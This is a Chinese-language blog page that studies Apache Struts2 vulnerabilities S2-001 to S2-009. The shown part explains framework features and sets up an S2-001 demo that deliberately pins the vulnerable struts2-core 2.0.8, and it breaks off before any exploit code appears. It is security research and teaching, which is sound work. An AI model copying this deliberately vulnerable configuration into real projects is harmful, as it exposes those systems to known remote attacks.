

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lingx5">
  <meta name="keywords" content="">
  
    <meta name="description" content="struts2 漏洞简介Struts2 是一款 JavaWeb MVC (Model-View-Controller)  框架，同时它具有如下特性：  POJO (Plain Old Java Object) Action: 控制器（Action）是简单的 Java 类，不需要实现特定的接口或继承特定的类（尽管可以继承 ActionSupport 来获得便利方法），这使得测试更加容易。 拦截器">
<meta property="og:type" content="article">
<meta property="og:title" content="struts2漏洞1-9">
<meta property="og:url" content="http://lingx5.github.io/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/index.html">
<meta property="og:site_name" content="lingx5的博客">
<meta property="og:description" content="struts2 漏洞简介Struts2 是一款 JavaWeb MVC (Model-View-Controller)  框架，同时它具有如下特性：  POJO (Plain Old Java Object) Action: 控制器（Action）是简单的 Java 类，不需要实现特定的接口或继承特定的类（尽管可以继承 ActionSupport 来获得便利方法），这使得测试更加容易。 拦截器">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407143216436.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407133753074.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407144320996.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407145041981.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407145131640.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407161432059.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407161542410.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407161725115.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407161929328.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407162137437.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407162612306.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407162716484.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407163911653.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407164215119.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407164331838.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407171033540.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407170252577.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407171313020.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407183948085.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407181821213.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407183201335.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407184330379.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407184522019.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407185415274.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407201025542.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407201157202.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407210625744.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407210842109.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407211040359.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407211352524.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407211431190.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407212043371.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407212804951.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407213347328.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407213854573.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408101743208.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408102032765.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408102135883.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408102747975.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408102610006.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408102858631.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408103021214.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408130408561.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408130520271.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408164738608.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408144609472.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408144856456.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408165140827.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408165321300.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408165356848.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408170429804.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408170523773.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408170902764.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408174638058.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408175307016.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408175608060.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408184404932.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408184932123.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408182016464.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408182045669.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408190227623.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408190714955.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408191245437.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408190948927.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408191548600.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250408205604183.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409093830901.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409094931824.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409095334113.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409102424409.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409103041065.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409103130411.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409104635205.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409105234009.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409123017789.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409122809009.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409125047313.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409125127030.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409125605744.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409150608407.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409150743359.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409151300703.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409153345360.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409152415626.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409154859565.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409161935368.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409165616851.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-14-13.gif">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-12-51.gif">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409192428124.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409192509224.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250409163039271.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410134711475.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410134727023.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410134743944.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410150233996.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410150429721.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410150549762.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410150633810.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410150809295.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410151155646.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410151434242.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410164211892.png">
<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410164845528.png">
<meta property="article:published_time" content="2025-04-10T10:14:55.000Z">
<meta property="article:modified_time" content="2025-04-10T10:16:17.371Z">
<meta property="article:author" content="lingx5">
<meta property="article:tag" content="Struts2">
<meta property="article:tag" content="java安全">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250407143216436.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>struts2漏洞1-9 - lingx5的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>lingx5的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="struts2漏洞1-9"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-04-10 18:14" pubdate>
          2025年4月10日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.1k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          60 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Struts2"
        id="heading-1bd159e8211d832bf81516263bc2d496" role="tab" data-toggle="collapse" href="#collapse-1bd159e8211d832bf81516263bc2d496"
        aria-expanded="true"
      >
        Struts2
        <span class="list-group-count">(2)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-1bd159e8211d832bf81516263bc2d496"
           role="tabpanel" aria-labelledby="heading-1bd159e8211d832bf81516263bc2d496">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/" title="struts2漏洞1-9"
           class="list-group-item list-group-item-action
           active">
          <span class="category-post">struts2漏洞1-9</span>
        </a>
      
    
      
      
        <a href="/2025/04/14/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/" title="struts2反序列化12-61"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">struts2反序列化12-61</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">struts2漏洞1-9</h1>
            
            
              <div class="markdown-body">
                
                <meta name="referrer" content="no-referrer" />

<h1 id="struts2-漏洞"><a href="#struts2-漏洞" class="headerlink" title="struts2 漏洞"></a>struts2 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Struts2 是一款 JavaWeb MVC (Model-View-Controller)  框架，同时它具有如下特性：</p>
<ol>
<li><strong>POJO (Plain Old Java Object) Action:</strong> 控制器（Action）是简单的 Java 类，不需要实现特定的接口或继承特定的类（尽管可以继承 <code>ActionSupport</code> 来获得便利方法），这使得测试更加容易。</li>
<li><strong>拦截器 (Interceptors):</strong> Struts 2 的核心。它们提供了一种面向切面编程 (AOP) 的方式来处理横切关注点，如日志记录、验证、文件上传、安全检查、数据绑定等。请求在到达 Action 之前和之后都会经过一系列配置好的拦截器。</li>
<li><strong>OGNL (Object-Graph Navigation Language):</strong> 强大的表达式语言，用于在视图层（如 JSP）访问和操作 <code>ValueStack</code> 中的数据，以及进行类型转换和数据绑定。<strong>（这也是 Struts 2 历史上许多严重安全漏洞的根源）</strong></li>
<li><strong>ValueStack:</strong> 每个请求的核心数据存储区域。它是一个栈结构，用于存放 Action 实例、模型对象以及其他上下文数据，使得 OGNL 可以方便地访问这些数据。</li>
<li><strong>结果类型 (Result Types):</strong> 定义了 Action 执行完毕后如何处理响应。常见的类型包括 <code>dispatcher</code> (转发到 JSP&#x2F;HTML), <code>redirect</code> (重定向到另一个 URL), <code>stream</code> (返回文件流), <code>json</code> (返回 JSON 数据) 等。结果是可配置和可扩展的。</li>
<li><strong>标签库 (Tag Library):</strong> 提供了一套丰富的 JSP 标签（如 <code>&lt;s:property&gt;</code>, <code>&lt;s:textfield&gt;</code>, <code>&lt;s:iterator&gt;</code>），用于简化视图开发，特别是与 <code>ValueStack</code> 和 OGNL 的集成。</li>
<li><strong>插件架构 (Plugins):</strong> 允许方便地集成第三方功能，如 Spring 集成、REST 支持、JSON 支持、Convention 插件（约定优于配置）等。</li>
<li><strong>基于 XML 或注解的配置：</strong> 主要通过 <code>struts.xml</code> 文件来配置 Action 映射、拦截器栈、结果等，但也支持使用注解进行配置（需要 Convention 插件）。</li>
</ol>
<p>漏洞项目：<a target="_blank" rel="noopener" href="https://github.com/xhycccc/Struts2-Vuln-Demo">https://github.com/xhycccc/Struts2-Vuln-Demo</a></p>
<h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><p>漏洞影响版本：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 </p>
<p>我们直接看入门的代码吧，以 s2-001 漏洞为例，了解一下 strut2 的运行机制和漏洞的产生原因</p>
<p>在 idea 中创建一个 webapp 的 maven 项目，引入依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>修改 web.xml，添加过滤器和映射路径</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>修改 src&#x2F;main&#x2F;webapp&#x2F;index.jsp 内容，利用 struts2 的标签 创建表单</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%--引入标签库--%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-<span class="hljs-number">001</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-<span class="hljs-number">001</span> Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span><br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>接着在 webapp 下 创建 hello.jsp 文件，用来做结果跳转页面</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-hello&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value=<span class="hljs-string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>在 main&#x2F;java 下 创建 com.lingx5.loginAction 的 java 类文件，用来处理请求</p>
<blockquote>
<p>struts2 适用 action 来处理请求的，功能类似于 servlet</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 